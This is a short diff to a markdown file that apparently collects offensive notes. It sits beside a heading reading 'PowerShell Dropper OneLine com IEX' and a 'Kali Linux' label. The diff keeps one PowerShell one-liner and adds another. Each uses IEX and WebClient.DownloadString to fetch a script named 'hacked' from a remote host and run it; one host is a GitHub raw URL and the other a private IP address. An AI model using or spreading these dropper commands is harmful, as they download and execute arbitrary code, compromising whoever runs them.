@@ -207,6 +207,9 @@ public class Wallpaper {
 ```
 powershell IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/thiagosmith/desk/refs/heads/main/hacked')
 ```
+```
+powershell IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.52.50/hacked')
+```
 
 ### PowerShell Dropper OneLine com IEX
 Kali Linux
